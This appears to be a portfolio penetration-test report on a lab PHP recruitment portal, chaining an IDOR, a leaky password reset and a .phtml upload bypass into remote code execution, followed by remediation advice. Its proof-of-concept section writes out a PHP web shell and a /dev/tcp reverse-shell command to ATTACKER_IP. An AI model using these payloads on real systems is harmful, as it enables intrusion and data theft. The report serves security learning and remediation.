# RecruitX — Full Engagement Report

## Executive Summary

RecruitX is an internal recruitment portal running a LAMP stack (Apache 2.4.58, PHP, MySQL). This engagement demonstrates a full web application penetration test from reconnaissance to remote code execution. Key findings include: an IDOR allowing user enumeration, a weak password-reset flow that exposed tokens, an admin file-upload that accepted `.phtml` leading to remote code execution, and an exposed API index.

This consolidated report is intended for a professional portfolio: it contains the methodology, evidence, proof-of-concept (PoC) commands, impact assessment, and remediation recommendations. Screenshots, raw outputs and PoC files belong in the `artifacts/` folder.

---

## Scope & Rules of Engagement

- Target: RecruitX web application (MACHINE_IP) running on port 80
- Scope: web application and related services discovered during reconnaissance
- Rules: non-destructive testing beyond proof-of-concept; follow responsible disclosure

---

## Table of Contents

- Reconnaissance
- Enumeration
- Exploitation (IDOR → Reset → Admin → Upload → RCE)
- Proof-of-Concept commands
- Impact and Risk
- Remediation and Remediation Priority
- Artifacts and appendices (screenshots, command outputs)

---

## Reconnaissance

Tools: `nmap`, `curl`, browser inspection

Findings:
- Open ports: `22` (ssh), `80` (http), `3306` (mysql), `8080` (http)
- Server header: `Apache/2.4.58 (Ubuntu)`
- PHP session cookie present: `PHPSESSID`
- Stack: Apache + PHP + MySQL (LAMP)

Why it matters: the technology stack directs which attack vectors and payloads are relevant (e.g., PHP upload/RCE, SQL-related issues).

---

## Enumeration

Tools: `gobuster`, manual browsing, curl

Discovered endpoints (important):
- `/login.php`, `/register.php`, `/reset.php`
- `/profile.php?id=` (IDOR candidate)
- `/api/` and `/api/user?id=` (exposes user JSON)
- `/admin` and `/admin/upload.php`
- `/uploads/documents/` (upload storage)

Observations:
- `/api` returned a JSON index of endpoints.
- `/reset.php` accessible without authentication.
- `/admin` redirected unauthenticated users to login.

---

## Exploitation (chained)

Overview: multiple medium/low-severity issues were chained to achieve RCE.

1) IDOR — profile and API
- While authenticated as `testuser@fake.thm` (id=6), `profile.php?id=1` revealed admin profile `s.mitchell@recruitx.thm`.
- API: `GET /api/user?id=1` returned JSON for the admin without requiring auth.

2) Weak Reset
- `/reset.php` displayed the reset token in the response.
- Tokens were 6-digit numeric values (low entropy).
- Using the admin email obtained from IDOR, a reset was performed to take over the admin account.

3) Admin upload bypass
- Logged in as admin, opened `/admin/upload.php`.
- Client-side: `accept` attribute limited selectable types (PDF/DOCX/images) — not enforcement.
- Server-side: blocklist of extensions blocked `.php` but accepted `.phtml`.
- Uploaded `test.phtml` containing `<?php echo "PHP is executing"; ?>` and confirmed execution at `/uploads/documents/test.phtml`.

4) RCE and post-exploitation
- Uploaded `shell.phtml` (simple web shell) and verified `whoami` → `www-data`.
- Confirmed system details via `hostname` and `uname -a` and enumerated `/etc/passwd`.
- Upgraded to a reverse shell using `nc` for an interactive session as `www-data`.

---

## Proof-of-Concept (selected commands)

Recon:

```bash
nmap -sV -sC -p- MACHINE_IP
curl -I http://MACHINE_IP
```

Directory enumeration:

```bash
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

IDOR/API:

```bash
curl "http://MACHINE_IP/api/user?id=1"
curl -s -b "PHPSESSID=<your_session>" "http://MACHINE_IP/profile.php?id=1"
```

Reset PoC (example):

```bash
# request reset and observe token in response
# password reset URL: /reset.php (form)
# use token to set new password for s.mitchell@recruitx.thm
```

Upload/RCE PoC:

```bash
# create a phtml file
echo '<?php if(isset($_GET["cmd"])) { echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; } ?>' > shell.phtml
# upload via admin panel to /uploads/documents/shell.phtml
# test command execution
curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=whoami"
```

Reverse shell (listener on attacker):

```bash
# Attacker listener
nc -lvnp 4444
# trigger reverse from web shell (URL-encoded)
curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

---

## Impact and Risk

- Remote code execution as `www-data` allows arbitrary command execution and access to application data.
- Admin account compromise enables configuration changes, user management, and sensitive data exposure.
- Chaining small issues led to full server compromise; this demonstrates a high business impact despite individually moderate technical severities.

---

## Remediation (priority)

1. Immediate (Critical)
- Fix reset flow: do not display tokens; send secure tokens to verified email addresses; use high-entropy tokens; add rate limiting.
- Harden file upload: implement extension allowlist + MIME/content validation; store uploads outside web root; disable execution for upload directories.

2. High
- Implement server-side authorization checks for all object access (IDOR fix).
- Add authentication and authorization on API endpoints; remove public API index.

3. Medium
- Monitor abnormal password-reset activity and enable alerts for high-volume requests.

---

## Artifacts and Appendices

Place screenshots, raw command output, `shell.phtml` PoC, and any diagrams in `artifacts/`. Example files to include:

- `nmap-output.txt`
- `gobuster-output.txt`
- `curl-profile-1.txt`
- `shell.phtml` (PoC)
- `screenshot-dashboard.png`
- `exploit-chain-diagram.svg`

---

## Next steps for the portfolio

- Add a one-page executive summary (PDF) for non-technical reviewers.
- Add an exploit-chain diagram and timeline showing how each finding led to the next.
- Include redacted screenshots and command outputs in `artifacts/`.
- Link this case study from `Penetration-Testing/README.md`.



*Report generated for portfolio use. Sensitive artifacts should be redacted before public sharing.*
